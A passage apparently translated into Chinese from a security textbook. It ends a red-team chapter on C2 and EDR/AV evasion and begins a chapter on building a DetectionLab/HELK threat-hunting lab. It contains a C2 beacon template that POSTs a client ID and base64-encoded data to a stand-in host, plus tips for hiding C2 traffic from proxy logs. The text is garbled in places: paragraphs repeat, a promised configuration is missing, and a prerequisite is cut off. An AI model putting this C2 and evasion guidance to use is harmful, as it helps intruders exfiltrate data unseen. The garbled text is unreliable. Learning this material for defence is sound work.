
Connection: Keep-Alive

在这里我们看到 C2 服务器的 ID 可能包含在 URI 行中。这将很容易看到并匹配到涉及的不同主机。因此，虽然这种简单的公式很常见，但将值放在 cookie 中会更好。

Cookie 不会在所有代理服务器上被记录，它们不是人们在报告中首先查看的内容，因此需要额外的挖掘才能看到。

对于发送数据，许多人使用 `POST` 请求，因为数据在有效负载（payload）中。这些数据的表示方式可能需要考虑。一个非常基础的配置可能如下所示：

```
POST /pong.php HTTP/1.1

User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)

Host: www.derp.pro

Content-Type: application/x-www-form-urlencoded

Content-Length: <length>

Accept-Language: en-us

Accept-Encoding: gzip, deflate

Connection: Keep-Alive
```

```
ID=<client ID>&data=<base64 encoded data>
```

虽然这是一个简单的公式，但将值放在 cookie 中会更好。Cookie 不会在所有代理服务器上被记录，它们不是人们在报告中首先查看的内容，因此需要额外的挖掘才能看到。

对于发送数据，许多人使用 `POST` 请求，因为数据在有效负载中。这些数据的表示方式可能需要考虑。一个非常基础的配置可能如下所示：

你可以了解你所遇到的 EDR 产品的最新技术。

### 总结

命令与控制（C2）和 shell 启动器（shellcode launchers）是红队和伦理黑客需要掌握的两个关键工具。C2 产品让我们能够远程控制主机，并更轻松地执行后渗透任务。启动器帮助我们把 C2 代理部署到系统中。理解这些内容，以及如何构建强力的网络规避配置并绕过系统上的 EDR 和 AV，将帮助我们把工具部署到系统中，并防止其被检测和缓解。我们在系统中留的时间越长且不被检测到，我们的任务成功的几率就越大。

### 延伸阅读

- Metasploit GitHub: github.com/rapid7/metasploit-framework
- Metasploitable: sourceforge.net/projects/metasploitable/
- Metasploit Unleashed: www.offensive-security.com/metasploit-unashed/
- PowerShell Empire: github.com/BC-SECURITY/Empire.
- Covenant GitHub: github.com/cobbr/Covenant
- SharpSploit: github.com/cobbr/SharpSploit
- Go shellcode repository: github.com/Ne0nd0g/go-shellcode
- Offensive Nim: github.com/byt3bl33d3r/OffensiveNim
- 使用直接系统调用和 SDRI 绕过 AV 和 EDR: outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/

# 如何使用 C++ 卸钩 DLL

- www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
- SharpBlock: github.com/CCob/SharpBlock
- 规避、绕过和禁用 MS ATP 和 ATA 的红队技术: www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf

# 第 8 章

## 构建威胁狩猎实验室

在本章中，我们将涵盖以下主题：

- 威胁狩猎与实验室
- 基础威胁狩猎实验室：DetectionLab
- 使用 HELK 扩展你的实验室

什么是威胁狩猎实验室？威胁狩猎将在下一章介绍，但本质上它是通过使用 SIEM、IDS、IPS 等技术对网络中不显而易见的威胁进行系统性的搜索。为了学习这项关键技能，你需要一个安全的环境进行实践——一个安装了所有所需工具、自动化部署并可以快速搭建和拆除的实验室。为此，我们将探索威胁狩猎实验室的最新、最佳选项。

### 威胁狩猎与实验室

威胁狩猎是一个手动过程，需要你了解进程、威胁行为者和 TTP（参见第 1 章）。更重要的是，需要实践来提高你的狩猎技能。在本章中，我们将重点关注搭建你的实验室。

# 威胁狩猎实验室的选择

有多种方法可以建立你自己的威胁狩猎实验室。例如，你可以手动设置威胁狩猎所需的所有内容，包括域服务器、工作站和安全工具。这个主题可以专门写一本书来讨论，但为了保持讨论简洁，我们将依靠自动化方法。尽管如此，正如你将看到的，我们仍然需要卷起袖子来定制自动化实验室。对于自动化威胁狩猎实验室，有两个项目得到了大量的支持并值得关注：DetectionLab 和 HELK。

首先，DetectionLab¹ 由 Chris Long (clong) 创建，受到了许多开发者的支持，并为在本地主机、通过多种操作系统以及云端安装提供了最丰富的工具选择和自动化选项。其次，HELK² 项目以及相关项目（如 Mordor³、OSSEM⁴ 和 The ThreatHunter-Playbook ⁵）得到了 Rodriguez 兄弟（Roberto 和 Jose）以及许多其他开发者（Open Threat Research Forge⁶）的支持支持，值得我们考虑和使用。这两个项目之间的主要区别是 DetectionLab 是一个完整的实验室环境，拥有所有所需的工具，但它侧重于 Splunk。而 HELK 不是一个完整的实验室环境，它是一个分析平台（基于 Elasticsearch⁷ 和工具），可以增强你现有的实验室环境。此外，请务必查看“延伸阅读”部分的 Blacksmith 和 SimLand。它们都提供了仅云端的实验室环境。然而，如果你寻求最大的灵活性以及本地安装选项，你应该选择 DetectionLab。最后，还有一些自动化实验室值得提及，但它们的支持较少，可能存在未解决的问题。其他项目列在本章的“延伸阅读”部分中。

# 本章的方法

在本章中，我们将结合上述两个项目的优点。我们将先从 DetectionLab 开始，利用其丰富的实验室环境以及广泛的安装和托管选项，然后通过在 DetectionLab 之上安装 HELK 和 Mordor 来增强它，带来这些工具带来的丰富经验。

# 基础威胁狩猎实验室：DetectionLab

首先，我们将构建一个基础威胁狩猎实验室，可以在你的本地主机上或云端构建。

# 前提条件

再次，在本章中，我们将使用 Chris Long (clong) 经典的 DetectionLab，并用 HELK 和 Mordor 对进行增强。前提条件是：

- 支持 Windows、Linux、macOS。
- 强烈建议 16GB内存。
- 55GB 空闲空间。
- 6.0 或更高版本。

## 实验 8-1：在你的主机上安装实验室

在本章中，我们将构建一个基础威胁狩猎实验室，可以在你的本地主机上或云端构建。

```
PS C:\Windows\system32> cd C:\DetectionLab\Vagrant

PS C:\DetectionLab\Vagrant> .\prepare.ps1

[+] Beginning pre-build checks for DetectionLab

[+] Checking for necessary tools in PATH...

[-] Packer was not found in your PATH.

[-] This is only needed if you plan to build your own boxes, otherwise you

can ignore this message.

[ ] Your version of Vagrant (2.2.16) is supported
...truncated brevity...

[+] Enumerating available providers...

[+] Available Providers:

[*] virtualbox
```
